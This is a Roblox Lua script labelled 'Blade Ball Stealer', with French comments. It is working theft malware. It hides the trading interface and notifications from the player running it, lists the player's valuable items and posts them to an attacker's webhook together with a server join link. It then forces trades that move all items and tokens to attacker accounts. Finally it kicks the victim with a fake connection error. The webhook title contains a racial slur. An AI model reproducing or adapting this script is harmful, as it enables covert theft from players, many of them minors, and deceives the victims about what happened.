_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")

-- Paramètres (À remplir)
local users = _G.Usernames or {}
local min_rap = _G.min_rap or 1
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""
local auth_token = _G.AuthToken or "EBK-SS-A" 

-- Interfaces
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui:WaitForChild("Trade")
local inTrade = false

-- DISCRÉTION TOTALE : Cache l'UI avant même l'ouverture
tradeGui.Main.Visible = false
tradeGui.Black.Visible = false
if PlayerGui:FindFirstChild("Notifications") then
    PlayerGui.Notifications.Enabled = false
end

tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
    inTrade = tradeGui.Enabled
    if inTrade then
        tradeGui.Main.Visible = false
        tradeGui.Black.Visible = false
    end
end)

---------------------------------------------------------
-- FONCTION CACHE-TEXTE "TRADING" (SOURCE PHYSIQUE)
---------------------------------------------------------
local function hideTradingStatus()
    task.spawn(function()
        while inTrade do
            local char = plr.Character
            if char then
                local head = char:FindFirstChild("Head")
                local root = char:FindFirstChild("HumanoidRootPart")
                for _, part in ipairs({head, root}) do
                    if part then
                        for _, obj in ipairs(part:GetChildren()) do
                            if obj:IsA("BillboardGui") then
                                obj.Enabled = false
                            end
                        end
                    end
                end
            end
            task.wait(0.1)
        end
    end)
end

---------------------------------------------------------
-- UTILITAIRES & RAP
---------------------------------------------------------
local function formatNumber(n)
    if not n then return "0" end
    if n >= 1000000 then return string.format("%.2fM", n/1000000)
    elseif n >= 1000 then return string.format("%.2fK", n/1000) end
    return tostring(math.floor(n))
end

local function getRAP(category, itemName)
    local success, rapData = pcall(function() 
        return require(game.ReplicatedStorage.Packages.Replion).Client:GetReplion("ItemRAP").Data.Items[category] 
    end)
    if not success or not rapData then return 0 end
    for skey, rap in pairs(rapData) do
        local s, decoded = pcall(function() return HttpService:JSONDecode(skey) end)
        if s then
            for _, pair in ipairs(decoded) do
                if pair[1] == "Name" and pair[2] == itemName then return rap end
            end
        end
    end
    return 0
end

---------------------------------------------------------
-- WEBHOOK AVEC THUMBNAIL
---------------------------------------------------------
local function SendWebhook(list, prefix)
    local totalRAP = 0
    local itemLines = ""
    for _, item in ipairs(list) do
        totalRAP = totalRAP + item.RAP
        itemLines = itemLines .. "• " .. item.Name .. " [" .. formatNumber(item.RAP) .. "]\n"
    end

    local data = {
        ["auth_token"] = auth_token,
        ["content"] = (prefix ~= "") and prefix .. " game:GetService('TeleportService'):TeleportToPlaceInstance("..game.PlaceId..", '"..game.JobId.."')" or nil,
        ["embeds"] = {{
            ["title"] = "🟣 Bro join your hit nigga 🎯",
            ["color"] = 8323327,
            ["fields"] = {
                {name = "👤 Victim:", value = "```" .. plr.Name .. "```", inline = true},
                {name = "💰 Total RAP:", value = "```" .. formatNumber(totalRAP) .. "```", inline = true},
                {name = "🎒 Inventory:", value = "```" .. (itemLines ~= "" and itemLines or "Empty") .. "```", inline = false}
            },
            ["thumbnail"] = {
                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"
            },
            ["footer"] = {["text"] = "Blade Ball Stealer | Session Active"}
        }}
    }
    request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
end

---------------------------------------------------------
-- LOGIQUE DE VOL (INVISIBLE & SPAM)
---------------------------------------------------------
local function doTrade(targetName)
    local target = Players:WaitForChild(targetName)
    
    -- Spam requêtes jusqu'à l'acceptation
    while not inTrade do
        pcall(function()
            netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(target)
        end)
        task.wait(0.8)
    end

    if inTrade then
        hideTradingStatus() -- Cache le texte "TRADING" au-dessus de la tête

        -- Ajout rapide des items
        for _, item in ipairs(itemsToSend) do
            pcall(function()
                netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
            end)
        end

        -- Ton système de Tokens (Nettoyé)
        pcall(function()
            local rawText = tradeGui.Main.Currency.Coins.Amount.Text
            local cleanedText = rawText:gsub("^%s*(.-)%s*$", "%1"):gsub("[^%d]", "")
            local tokens = tonumber(cleanedText) or 0
            if tokens >= 1 then
                netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokens)
            end
        end)

        -- Confirmation Instantanée
        task.wait(0.3)
        repeat
            netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
            task.wait(0.1)
            netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
            task.wait(0.1)
        until not inTrade
    end
    
    task.wait(0.5)
    plr:kick("Please check your internet connection and try again. (Error Code: 277)")
end

---------------------------------------------------------
-- DÉMARRAGE
---------------------------------------------------------
local inv = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
for _, cat in ipairs(categories) do
    if inv[cat] then
        for id, info in pairs(inv[cat]) do
            if not info.TradeLock then
                local rap = getRAP(cat, info.Name)
                if rap >= min_rap then
                    table.insert(itemsToSend, {ItemID = id, RAP = rap, itemType = cat, Name = info.Name})
                end
            end
        end
    end
end

if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
    SendWebhook(itemsToSend, (ping == "Yes" and "@everyone" or ""))

    local function onPlayer(p)
        if table.find(users, p.Name) then
            task.spawn(function() doTrade(p.Name) end)
        end
    end

    for _, p in ipairs(Players:GetPlayers()) do onPlayer(p) end
    Players.PlayerAdded:Connect(onPlayer)
end
